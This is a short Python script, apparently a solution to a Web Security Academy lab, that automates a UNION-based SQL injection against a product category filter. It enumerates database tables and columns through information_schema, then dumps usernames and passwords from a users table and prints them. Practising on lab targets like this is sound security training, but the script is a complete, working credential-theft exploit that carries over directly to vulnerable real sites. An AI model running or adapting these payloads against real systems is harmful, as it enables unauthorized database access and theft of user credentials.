import requests
from bs4 import BeautifulSoup
url = "https://0af60001045f32e3802b3fbe00dd001d.web-security-academy.net/filter?category="

sqliGetTable = "' UNION SELECT table_name, NULL FROM information_schema.tables--"

responseTable = requests.get(url=(url + sqliGetTable)).text
soupForTable = BeautifulSoup(responseTable, 'html.parser')
tables = soupForTable.find_all("th")
for table in tables:
    sqliToGetColumn = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{table.text}'--"
    print("Found table: " + table.text)
    print("Inside table: " + table.text)
    responseColumn = requests.get(url=(url + sqliToGetColumn)).text
    soupForColumn = BeautifulSoup(responseColumn, 'html.parser')
    columns = soupForColumn.find_all("th")
    for column in columns:
        print("Column: " + column.text)
    print("--------------------")

tableToRetrive = "users_ejsxti"
usernameColumn = "username_slqebf"
passwordColumn = "password_jbuiek"
sqliToGetData = f"' UNION SELECT {usernameColumn}, {passwordColumn} FROM {tableToRetrive}--"

responseData = requests.get(url=(url + sqliToGetData)).text
soupForData = BeautifulSoup(responseData, 'html.parser')
usernameInfo = soupForData.find_all("th")
passwordInfo = soupForData.find_all("td")
for i, j  in zip(usernameInfo, passwordInfo):
    print("Username: " + i.text)
    print("Password: " + j.text)

print("Please login to solve the lab!")